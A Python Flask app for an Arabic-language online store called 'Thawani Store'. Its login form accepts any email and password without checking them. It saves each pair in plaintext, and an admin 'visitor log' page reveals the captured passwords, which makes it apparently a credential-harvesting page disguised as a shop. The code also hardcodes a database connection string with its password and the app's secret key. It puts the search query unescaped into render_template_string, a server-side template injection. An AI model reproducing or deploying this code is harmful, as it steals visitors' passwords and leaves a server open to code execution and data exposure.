import os
import psycopg2
from psycopg2.extras import DictCursor
from flask import Flask, request, render_template_string, redirect, session

app = Flask(__name__)
app.secret_key = "Thawani_2026"

# رابط قاعدة البيانات حقك
DATABASE_URL = "postgresql://neondb_owner:npg_LfrcOy0oTV6F@ep-bold-voice-an2t0k43.c-6.us-east-1.aws.neon.tech/neondb?sslmode=require"

def get_db_connection():
    return psycopg2.connect(DATABASE_URL, cursor_factory=DictCursor)

@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    query = request.args.get('q', '')
    conn = get_db_connection()
    cur = conn.cursor()
    if query:
        cur.execute("SELECT * FROM products WHERE name ILIKE %s", (f'%{query}%',))
    else:
        cur.execute("SELECT * FROM products")
    products = cur.fetchall()
    cur.close()
    conn.close()

    # --- خانة البحث (ستظهر فوق المنتجات) ---
    search_html = f'''
    <div style="padding:15px; background:#fff; border-bottom:1px solid #ddd;">
        <form action="/" method="GET" style="display:flex; gap:10px;">
            <input type="text" name="q" placeholder="🔍 ابحث هنا..." value="{query}" style="flex:1; padding:10px; border-radius:8px; border:1px solid #ccc;">
            <button type="submit" style="padding:10px 20px; background:#1a237e; color:white; border:none; border-radius:8px;">بحث</button>
        </form>
    </div>
    '''

    items_html = ""
    for p in products:
        items_html += f'<div style="border:1px solid #eee; padding:10px; border-radius:10px; background:#white;"><img src="/static/uploads/{p["img"]}" style="width:100%; height:120px; object-fit:cover;"><h4>{p["name"]}</h4><p style="color:green;">{p["price"]} OMR</p></div>'

    if not products:
        items_html = "<p style='text-align:center; padding:50px;'>لا توجد منتجات حالياً</p>"

    return render_template_string(f'''
    <html>
    <head><style>body {{ font-family: sans-serif; direction: rtl; background: #f4f4f4; margin: 0; }}</style></head>
    <body>
        <header style="background:#1a237e; color:white; padding:20px; text-align:center; font-size:24px;">THAWANI STORE</header>
        {search_html}
        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; padding:10px;">{items_html}</div>
    </body>
    </html>
    ''')

# --- سجل الزوار بالعين 👁️ ---
@app.route('/admin_logs')
def admin_logs():
    if not session.get('is_admin'): return "غير مسموح لك", 403
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT email, password FROM users ORDER BY id DESC")
    users = cur.fetchall()
    cur.close()
    conn.close()

    rows = ""
    for i, u in enumerate(users):
        rows += f'<tr><td><span id="e{i}">****</span> <button onclick="t(\'e{i}\',\'{u["email"]}\')">👁️</button></td><td><span id="p{i}">****</span> <button onclick="t(\'p{i}\',\'{u["password"]}\')">👁️</button></td></tr>'

    return render_template_string(f'''
    <html><body style="direction:rtl; text-align:center; font-family:sans-serif;">
    <h2>سجل الزوار</h2>
    <table border="1" style="width:100%; border-collapse:collapse;">
        <tr><th>الإيميل</th><th>الباسورد</th></tr>{rows}
    </table>
    <script>function t(id,v){{var x=document.getElementById(id); x.innerText=(x.innerText==="****")?v:"****";}}</script>
    </body></html>
    ''')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email, pw = request.form.get('email'), request.form.get('password')
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO users (email, password) VALUES (%s, %s) ON CONFLICT (email) DO UPDATE SET password=%s", (email, pw, pw))
        conn.commit()
        session['user'], session['is_admin'] = email, (email == "qwerasdf1234598760@gmail.com")
        cur.close(); conn.close()
        return redirect('/')
    return '<html><body style="text-align:center; padding-top:100px;"><form method="POST"><h2>دخول متجر ثواني</h2><input name="email" placeholder="الايميل" required><br><br><input name="password" type="password" placeholder="الباسورد" required><br><br><button type="submit">دخول</button></form></body></html>'

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
